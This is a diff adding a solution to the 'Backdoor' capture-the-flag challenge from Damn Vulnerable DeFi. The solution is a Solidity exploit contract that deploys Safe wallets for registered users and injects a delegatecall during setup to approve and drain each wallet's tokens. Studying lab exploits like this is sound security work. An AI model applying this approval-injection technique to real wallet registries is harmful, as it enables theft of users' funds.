@@ -5,6 +5,9 @@ pragma solidity ^0.8.30;
 import {Test, console} from "forge-std/Test.sol";
 import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
+import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
+import {IProxyCreationCallback} from "@safe-global/safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
 
@@ -70,7 +73,17 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        new BackdoorExploit(
+            address(walletFactory),
+            address(walletRegistry),
+            address(singletonCopy),
+            address(token),
+            users[0],
+            users[1],
+            users[2],
+            users[3],
+            recovery
+        ).attack();
     }
 
     /**
@@ -94,3 +107,73 @@ contract BackdoorChallenge is Test {
         assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
     }
 }
+
+contract BackdoorExploit {
+    address walletFactory;
+    address walletRegistry;
+    address[] users;
+    address recovery;
+    address singleton;
+    address token;
+    TokenApprover approver;
+
+    constructor(
+        address walletFactoryAddress,
+        address walletRegistryAddress,
+        address singletonAddress,
+        address tokenAddress,
+        address aliceAddress,
+        address bobAddress,
+        address charlieAddress,
+        address davidAddress,
+        address recoveryAddress
+    ) {
+        walletFactory = walletFactoryAddress;
+        walletRegistry = walletRegistryAddress;
+        singleton = singletonAddress;
+        users = [aliceAddress, bobAddress, charlieAddress, davidAddress];
+        recovery = recoveryAddress;
+        singleton = singletonAddress;
+        token = tokenAddress;
+        approver = new TokenApprover();
+    }
+
+    function attack() public {
+        address[] memory owners = new address[](1);
+        bytes memory approveCall = abi.encodeWithSelector(
+            TokenApprover.approve.selector,
+            token,
+            address(this)
+        );
+        for (uint256 index = 0; index < users.length; index++) {
+            owners[0] = users[index];
+            bytes memory initializer = abi.encodeWithSelector(
+                Safe.setup.selector,
+                owners,
+                1,
+                address(approver),
+                approveCall,
+                address(0),
+                address(0),
+                0,
+                address(0)
+            );
+            SafeProxy proxy = SafeProxyFactory(walletFactory).createProxyWithCallback(
+                singleton,
+                initializer,
+                0,
+                IProxyCreationCallback(walletRegistry)
+            );
+            IERC20(token).transferFrom(address(proxy), recovery, 10e18);
+        }
+    }
+
+    receive() external payable {}
+}
+
+contract TokenApprover {
+    function approve(address token, address spender) external {
+        IERC20(token).approve(spender, type(uint256).max);
+    }
+}
+
